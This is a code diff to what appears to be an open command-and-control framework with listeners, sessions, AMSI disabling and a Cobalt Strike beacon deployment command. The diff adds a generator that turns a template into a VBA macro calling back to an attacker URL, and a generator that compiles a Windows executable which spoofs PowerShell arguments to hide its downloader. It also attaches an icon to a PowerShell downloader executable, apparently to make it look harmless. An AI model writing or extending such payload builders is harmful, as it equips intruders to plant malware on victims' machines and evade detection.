@@ -30,7 +30,7 @@ iv = "".join([random.choice(string.ascii_uppercase) for i in range(AES.block_siz
 aes_key = base64.b64encode(bytearray(key, "UTF-8")).decode()
 aes_iv = base64.b64encode(bytearray(iv, "UTF-8")).decode()
 
-oct_commands = ["help", "exit", "interact", "list", "listeners", "listen_http", "listen_https", "delete", "generate_powershell", "generate_unmanaged_exe","generate_hta", "generate_digispark", "delete_listener"]
+oct_commands = ["help", "exit", "interact", "list", "listeners", "listen_http", "listen_https", "delete", "generate_powershell", "generate_unmanaged_exe","generate_hta", "generate_macro", "generate_digispark", "delete_listener", "generate_spoofed_args_exe"]
 
 oct_commands_interact = ["load", "help", "exit", "back", "clear", "download", "load", "report", "disable_amsi", "modules", "deploy_cobalt_beacon"]
 
@@ -214,6 +214,52 @@ def generate_digispark(hostname, path, proto, output_path):
         print("[-] error while generating the file!")
 
 
+def generate_macro(hostname, path, proto, output_path):
+    full_url = "{2}://{0}/{1}".format(hostname, path, proto)
+    char = random.choice(string.ascii_uppercase)
+    char2 = random.choice(string.ascii_uppercase)
+    fake_file_name = "".join([random.choice(string.ascii_uppercase) for i in range(5)])
+    ft = open("agents/agent.macro")
+    template = ft.read()
+    code = template.replace("OCT_URL", full_url)
+    code = code.replace("OCTCHAR", char)
+    code = code.replace("VARVAR", char2)
+    code = code.replace("TEMPTEMP", fake_file_name)
+    ft.close()
+    try:
+        f = open(output_path, "w")
+        f.write(code)
+        print(colored("[+] Macro generated successfully!", "green"))
+        f.close()
+    except:
+        print(colored("[-] Unable to write file! Please check file path", "red"))
+
+
+def generate_spoofed_args_exe(hostname, path, proto, output_path):
+    # x86_64-w64-mingw32-g++ arguments_spoofer.cpp -o arguments_spoofer.exe -static
+    if os.system("which x86_64-w64-mingw32-g++") == 0:
+        url = "{2}://{0}/{1}".format(hostname, path, proto)
+        ft = open("agents/args_spoofer.cpp")
+        char = random.choice(string.ascii_uppercase)
+        template = ft.read()
+        code = template.replace("OCT_COMMAND", url)
+        code = code.replace("OCTCHAR", char)
+        f = open("tmp.cpp", "w")
+        f.write(code)
+        f.close()
+        compile_command = "x86_64-w64-mingw32-g++ tmp.cpp -o %s -static" % output_path
+        if os.system(compile_command) == 0:
+            print((colored("[+] file compiled successfully !", "green")))
+            print((colored("[+] binary file saved to {0}".format(output_path), "red")))
+            os.system("rm tmp.cpp")
+        else:
+            print("[-] error while compiling !")
+
+
+    else:
+        print("[-] Mingw compiler is not installed !")
+
+
 def generate_exe_powershell_downloader(hostname, path, proto, output_path):
 	if os.system("which mono-csc") == 0:
 		url = "{2}://{0}/{1}".format(hostname, path, proto)
@@ -223,7 +269,7 @@ def generate_exe_powershell_downloader(hostname, path, proto, output_path):
 		f = open("tmp.cs", "w")
 		f.write(code)
 		f.close()
-		compile_command = "mono-csc /target:winexe /reference:includes/System.Management.Automation.dll tmp.cs /out:%s" % output_path
+		compile_command = "mono-csc /target:winexe /reference:includes/System.Management.Automation.dll tmp.cs /win32icon:1.ico /out:%s" % output_path
 		if os.system(compile_command) == 0:
 			print((colored("[+] file compiled successfully !", "green")))
 			print((colored("[+] binary file saved to {0}".format(output_path), "red")))
@@ -245,7 +291,9 @@ def main_help_banner():
     print("* generate_powershell \t\tgenerate powershell oneliner")
     print("* generate_hta \t\t\tgenerate HTA Link")
     print("* generate_unmanaged_exe \tgenerate unmanaged executable agent")
+    print("* generate_spoofed_args_exe \tgenerate executable that fake the powerhell oneliner args")
     print("* generate_digispark \t\tgenerate digispark file (HID Attack)")
+    print("* generate_macro \t\tgenerate VBA macro")
     print("* listen_http  \t\t\tto start a HTTP listener")
     print("* listen_https  \t\tto start a HTTPS listener")
     print("interact {session}  \t\tto interact with a session")
